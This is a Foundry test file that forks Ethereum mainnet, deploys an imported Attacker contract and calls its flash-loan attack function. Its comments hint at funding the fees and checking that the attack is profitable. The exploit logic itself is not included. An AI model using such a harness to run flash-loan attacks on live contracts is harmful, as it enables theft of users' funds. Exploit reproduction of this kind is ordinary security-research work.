// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Attacker.sol"; // Adjust path to your Attacker contract

contract MakingFakeTokenIdListPassTest is Test {
    Attacker template;
    Attacker attacker;

    function setUp() public {
        // Fork mainnet at a specific block if needed
        // vm.createSelectFork("mainnet", BLOCK_NUMBER);

        // Or just fork latest mainnet
        vm.createSelectFork("mainnet");

        // Deploy with CREATE2 for deterministic address
        bytes32 salt = bytes32(uint256(0x123));
        attacker = new Attacker{salt: salt}();

        console.log("Attacker deployed at:", address(attacker));

        // Fund the attacker with initial capital if needed
        // You might need some initial USDC/WETH to pay for flash loan fees
        /* deal(USDC, address(attacker), 1000e6); // 1000 USDC for fees */
        /* deal(WETH, address(attacker), 1e18);   // 1 WETH for fees */
    }

    function testTakeFlashLoanAndAttack() public {
        // Run the attack
        attacker.takeFlashLoanAndAttack();

        // Add assertions here if you want to verify specific outcomes
        // For example:
        // assertGt(IERC20(USDC).balanceOf(address(attacker)), 1000e6, "Attack should be profitable");
    }

    // Alternative: if you want to run it without the test prefix for debugging
    function testAttackExecution() public {
        console.log("Starting attack simulation...");
        attacker.takeFlashLoanAndAttack();
        console.log("Attack completed");
    }
}
